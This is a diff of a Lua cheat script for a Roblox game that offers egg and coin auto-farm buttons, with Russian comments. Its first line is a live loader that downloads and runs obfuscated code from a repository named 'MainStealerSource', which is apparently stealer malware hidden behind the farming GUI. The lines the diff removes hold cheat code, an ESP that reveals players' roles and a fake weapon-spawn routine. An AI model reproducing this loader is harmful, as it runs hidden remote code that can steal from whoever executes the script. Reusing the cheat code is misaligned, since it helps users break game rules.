@@ -1,4 +1,3 @@
-
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/hubsrblx/MainStealerSource/refs/heads/main/SourceObf.txt')))()
 
 -- Проверка на уже запущенный скрипт
@@ -50,7 +49,7 @@ local function ShowLoadingScreen()
     Title.Size = UDim2.new(1, 0, 0, 40)
     Title.Position = UDim2.new(0, 0, 0, 10)
     Title.BackgroundTransparency = 1
-    Title.Text = "Sqwix"
+    Title.Text = "Sqwix Scripts"
     Title.TextColor3 = Color3.fromRGB(170, 0, 255)
     Title.Font = Enum.Font.ArimoBold
     Title.TextSize = 24
@@ -118,23 +117,19 @@ local MAIN_FONT = Enum.Font.ArimoBold
 local SPECIAL_FONT = Enum.Font.FredokaOne
 
 -- Тексты интерфейса
-local TEXT_TITLE = "Enter Text..."
+local TEXT_TITLE = "sqwix 🥚"
 local TEXT_MINIMIZE = "-"
 local TEXT_CLOSE = "X"
-local TEXT_AUTO_EGG = "Egg Farm [🥚]"
-local TEXT_AUTO_COINS = "Coin Farm [💵]"
-local TEXT_AUTO_BOTH = "Coin & Egg Farm [👩🏿‍🌾]"
-local TEXT_AUTO_RARE = "Rare Egg Farm [💎]"
-local TEXT_ESP = "ESP [👁️‍🗨️]"
-local TEXT_SPAWN = "Spawn"
-local TEXT_WEAPON_PLACEHOLDER = "Enter Weapon Name"
+local TEXT_AUTO_EGG = "Egg Farm - 🥚"
+local TEXT_AUTO_COINS = "Coin Farm - 💵"
+local TEXT_AUTO_BOTH = "Coin & Egg Farm - 👩🏿‍🌾"
+local TEXT_AUTO_RARE = "Rare Egg Farm - 💎"
 local TEXT_RARE_EGG_NOTE = "Maybe little bugs with egg which you have"
 
 -- Размеры текста
 local TEXT_SIZE_TITLE = 18
 local TEXT_SIZE_BUTTON = 14
 local TEXT_SIZE_NOTE = 10
-local TEXT_SIZE_WEAPON = 12
 
 -- Сервисы
 local Player = game.Players.LocalPlayer
@@ -157,8 +152,6 @@ local FullEggBag = false
 local CurrentCoinTypes = {}
 local CollectedCoins = {}
 local NeededCoinTypes = {}
-local ESPEnabled = false
-local roles = {}
 local activeFarmButton = nil
 local currentTween = nil
 local processedEggs = {}
@@ -382,7 +375,7 @@ local function CreateMainGUI()
 
     local MainFrame = Instance.new("Frame")
     MainFrame.Name = "MainFrame"
-    MainFrame.Size = UDim2.new(0, 300, 0, 305)
+    MainFrame.Size = UDim2.new(0, 300, 0, 220)
     MainFrame.AnchorPoint = Vector2.new(1, 0)
     MainFrame.Position = UDim2.new(1, -10, 0, 10)
     MainFrame.BackgroundColor3 = BLACK_MAIN
@@ -647,174 +640,6 @@ local function CreateMainGUI()
     RareEggNote.TextXAlignment = Enum.TextXAlignment.Center
     RareEggNote.TextYAlignment = Enum.TextYAlignment.Center
     RareEggNote.Parent = MainFrame
-
-    currentY = currentY + buttonHeight + buttonSpacing + 10
-
-    -- ESP функции
-    local function IsAlive(player)
-        for i, v in pairs(roles) do
-            if player.Name == i then
-                return not v.Killed and not v.Dead
-            end
-        end
-        return false
-    end
-
-    local function CreateHighlight()
-        for _, v in pairs(Players:GetPlayers()) do
-            if v ~= Player and v.Character and not v.Character:FindFirstChild("Highlight") then
-                local highlight = Instance.new("Highlight")
-                highlight.FillTransparency = 0.5
-                highlight.OutlineTransparency = 0
-                highlight.Parent = v.Character
-            end
-        end
-    end
-
-    local function UpdateHighlights()
-        local Murder, Sheriff, Hero
-        
-        for i, v in pairs(roles) do
-            if v.Role == "Murderer" then
-                Murder = i
-            elseif v.Role == 'Sheriff' then
-                Sheriff = i
-            elseif v.Role == 'Hero' then
-                Hero = i
-            end
-        end
-
-        for _, v in pairs(Players:GetPlayers()) do
-            if v ~= Player and v.Character and v.Character:FindFirstChild("Highlight") then
-                local Highlight = v.Character:FindFirstChild("Highlight")
-                if v.Name == Sheriff and IsAlive(v) then
-                    Highlight.FillColor = Color3.fromRGB(0, 0, 255)
-                    Highlight.OutlineColor = Color3.fromRGB(0, 0, 200)
-                elseif v.Name == Murder and IsAlive(v) then
-                    Highlight.FillColor = Color3.fromRGB(255, 0, 0)
-                    Highlight.OutlineColor = Color3.fromRGB(200, 0, 0)
-                elseif v.Name == Hero and IsAlive(v) and (not Sheriff or not IsAlive(game.Players[Sheriff])) then
-                    Highlight.FillColor = Color3.fromRGB(255, 255, 0)
-                    Highlight.OutlineColor = Color3.fromRGB(200, 200, 0)
-                else
-                    Highlight.FillColor = Color3.fromRGB(0, 255, 0)
-                    Highlight.OutlineColor = Color3.fromRGB(0, 200, 0)
-                end
-            end
-        end
-    end
-
-    local ESPButton = Instance.new("TextButton")
-    ESPButton.Name = "ESP"
-    ESPButton.Size = UDim2.new(0.8, 0, 0, buttonHeight)
-    ESPButton.Position = UDim2.new(0.1, 0, 0, currentY)
-    ESPButton.BackgroundColor3 = DARK_GRAY_HEADER
-    ESPButton.BackgroundTransparency = DARK_GRAY_HEADER_TRANSPARENCY
-    ESPButton.TextColor3 = WHITE_TEXT
-    ESPButton.Text = TEXT_ESP..": OFF"
-    ESPButton.Font = MAIN_FONT
-    ESPButton.TextSize = TEXT_SIZE_BUTTON
-    ESPButton.TextYAlignment = Enum.TextYAlignment.Center
-    ESPButton.Parent = MainFrame
-
-    local ESPCorner = Instance.new("UICorner")
-    ESPCorner.CornerRadius = UDim.new(0, 8)
-    ESPCorner.Parent = ESPButton
-
-    ESPButton.MouseButton1Click:Connect(function()
-        ESPEnabled = not ESPEnabled
-        
-        if ESPEnabled then
-            ESPButton.Text = ESPButton.Text:gsub(": OFF", ": ON")
-            ESPButton.BackgroundColor3 = PURPLE_ACCENT
-            ESPButton.BackgroundTransparency = PURPLE_ACCENT_TRANSPARENCY
-            spawn(function()
-                while ESPEnabled and not _G.IsLoading do
-                    roles = game.ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
-                    CreateHighlight()
-                    UpdateHighlights()
-                    task.wait()
-                end
-            end)
-        else
-            ESPButton.Text = ESPButton.Text:gsub(": ON", ": OFF")
-            ESPButton.BackgroundColor3 = DARK_GRAY_HEADER
-            ESPButton.BackgroundTransparency = DARK_GRAY_HEADER_TRANSPARENCY
-            for _, v in pairs(Players:GetPlayers()) do
-                if v ~= Player and v.Character and v.Character:FindFirstChild("Highlight") then
-                    v.Character:FindFirstChild("Highlight"):Destroy()
-                end
-            end
-        end
-    end)
-
-    currentY = currentY + buttonHeight + buttonSpacing
-
-    -- Оружие
-    local WeaponBox = Instance.new("TextBox")
-    WeaponBox.Name = "WeaponBox"
-    WeaponBox.Size = UDim2.new(0.6, 0, 0, buttonHeight)
-    WeaponBox.Position = UDim2.new(0.1, 0, 0, currentY)
-    WeaponBox.BackgroundColor3 = DARK_GRAY_HEADER
-    WeaponBox.BackgroundTransparency = DARK_GRAY_HEADER_TRANSPARENCY
-    WeaponBox.TextColor3 = WHITE_TEXT
-    WeaponBox.Font = MAIN_FONT
-    WeaponBox.TextSize = TEXT_SIZE_WEAPON
-    WeaponBox.TextYAlignment = Enum.TextYAlignment.Center
-    WeaponBox.Text = ""
-    WeaponBox.PlaceholderText = TEXT_WEAPON_PLACEHOLDER
-    WeaponBox.PlaceholderColor3 = GRAY_NOTE
-    WeaponBox.Parent = MainFrame
-
-    local WeaponCorner = Instance.new("UICorner")
-    WeaponCorner.CornerRadius = UDim.new(0, 8)
-    WeaponCorner.Parent = WeaponBox
-
-    local SpawnButton = Instance.new("TextButton")
-    SpawnButton.Name = "SpawnButton"
-    SpawnButton.Size = UDim2.new(0.18, 0, 0, buttonHeight)
-    SpawnButton.Position = UDim2.new(0.72, 0, 0, currentY)
-    SpawnButton.BackgroundColor3 = PURPLE_ACCENT
-    SpawnButton.BackgroundTransparency = PURPLE_ACCENT_TRANSPARENCY
-    SpawnButton.TextColor3 = WHITE_TEXT
-    SpawnButton.Text = TEXT_SPAWN
-    SpawnButton.Font = MAIN_FONT
-    SpawnButton.TextSize = TEXT_SIZE_WEAPON
-    SpawnButton.TextYAlignment = Enum.TextYAlignment.Center
-    SpawnButton.Parent = MainFrame
-
-    local SpawnCorner = Instance.new("UICorner")
-    SpawnCorner.CornerRadius = UDim.new(0, 8)
-    SpawnCorner.Parent = SpawnButton
-
-    local function spawnWeapon(name)
-        if _G.IsLoading or name == "" then return end
-        
-        local DataBase, PlayerData = require(game:GetService("ReplicatedStorage").Database.Sync.Item), 
-                                   require(game:GetService("ReplicatedStorage").Modules.ProfileData)
-        local PlayerWeapons = PlayerData.Weapons
-
-        if not PlayerWeapons.Owned[name] then
-            PlayerWeapons.Owned[name] = 1
-        else
-            PlayerWeapons.Owned[name] += 1
-        end
-
-        game:GetService("RunService"):BindToRenderStep("InventoryUpdate", 0, function()
-            PlayerData.Weapons = PlayerWeapons
-        end)
-
-        game.Players.LocalPlayer.Character:BreakJoints()
-    end
-
-    SpawnButton.MouseButton1Click:Connect(function()
-        if _G.IsLoading then return end
-        local weaponName = WeaponBox.Text
-        if weaponName ~= "" then
-            spawnWeapon(weaponName)
-            WeaponBox.Text = ""
-        end
-    end)
 
     -- Закрытие GUI
     CloseButton.MouseButton1Click:Connect(function()
